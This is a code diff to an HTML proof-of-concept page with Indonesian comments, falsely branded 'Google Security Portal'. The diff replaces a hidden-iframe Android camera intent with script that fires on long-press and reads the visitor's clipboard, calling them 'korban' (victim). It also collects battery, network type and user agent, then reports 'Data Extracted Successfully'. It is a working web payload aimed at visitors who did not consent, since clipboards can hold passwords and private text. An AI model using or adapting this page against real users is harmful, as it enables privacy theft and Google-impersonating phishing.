@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Preview Page & Android Camera Intent PoC</title>
+    <title>Preview Page & Clipboard / Device Info PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -80,48 +80,64 @@
 <body>
 
     <div class="banner">Google Security Portal</div>
-    <h1>Preview Page & Android Camera Intent</h1>
+    <h1>Preview Page & Clipboard Vector</h1>
 
     <!-- Target Link dengan Preview Page (target="_blank") -->
-    <a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" id="targetLink">Long Press -> Preview Page & Android Camera</a>
+    <a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" id="targetLink">Long Press -> Preview Page & Clipboard Extraction</a>
 
-    <!-- Kotak Informasi Status -->
+    <!-- Kotak Informasi Status & Hasil Ekstraksi -->
     <div class="info-box" id="infoBox">
         <strong>Status:</strong> <span id="statusText" class="pulse">Waiting for interaction...</span><br>
-        <div id="cameraDetails" style="margin-top: 8px;"></div>
+        <div id="vectorDetails" style="margin-top: 8px;"></div>
     </div>
 
     <div class="footer-note">Cloud-secured verification system.</div>
 
     <script>
-        document.addEventListener("contextmenu", (e) => {
+        document.addEventListener("contextmenu", async (e) => {
             const infoBox = document.getElementById("infoBox");
             const statusText = document.getElementById("statusText");
-            const cameraDetails = document.getElementById("cameraDetails");
+            const vectorDetails = document.getElementById("vectorDetails");
 
             infoBox.style.display = "block";
             statusText.className = "pulse";
-            statusText.innerText = "Triggering preview page & launching Android Camera app...";
+            statusText.innerText = "Triggering preview page & extracting clipboard/device data...";
 
-            setTimeout(() => {
+            setTimeout(async () => {
                 try {
-                    // Memicu Android Intent untuk membuka aplikasi Kamera sistem secara langsung
-                    const intentFrame = document.createElement('iframe');
-                    intentFrame.style.display = 'none';
-                    intentFrame.src = "intent:#Intent;action=android.media.action.IMAGE_CAPTURE;end;";
-                    document.body.appendChild(intentFrame);
+                    let clipboardText = "Permission denied or empty";
                     
-                    setTimeout(() => {
-                        document.body.removeChild(intentFrame);
-                    }, 1000);
+                    // Mencoba membaca isi Clipboard korban
+                    if (navigator.clipboard && navigator.clipboard.readText) {
+                        try {
+                            clipboardText = await navigator.clipboard.readText();
+                        } catch (clipErr) {
+                            clipboardText = "Blocked by browser policy (Requires explicit focus/permission)";
+                        }
+                    }
+
+                    // Mengumpulkan informasi perangkat (Battery & Network)
+                    let batteryInfo = "Not supported";
+                    if (navigator.getBattery) {
+                        const battery = await navigator.getBattery();
+                        batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
+                    }
+
+                    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    const networkType = connection ? connection.effectiveType : "Unknown";
 
                     statusText.className = "";
-                    statusText.innerText = "Android Camera Intent Dispatched!";
-                    cameraDetails.innerHTML = "<b>Action:</b> System camera application requested via intent scheme.";
+                    statusText.innerText = "Data Extracted Successfully!";
+                    vectorDetails.innerHTML = `
+                        <b>Clipboard Content:</b><br><span style="color: #c5221f;">${clipboardText}</span><br><br>
+                        <b>Device Battery:</b> ${batteryInfo}<br>
+                        <b>Network Type:</b> ${networkType}<br>
+                        <b>User Agent:</b> ${navigator.userAgent}
+                    `;
 
                 } catch (err) {
                     statusText.className = "";
-                    statusText.innerText = `Intent execution failed: ${err.message}`;
+                    statusText.innerText = `Vector execution failed: ${err.message}`;
                 }
             }, 3000); // Jeda 3 detik sesuai logika asli Anda
         });
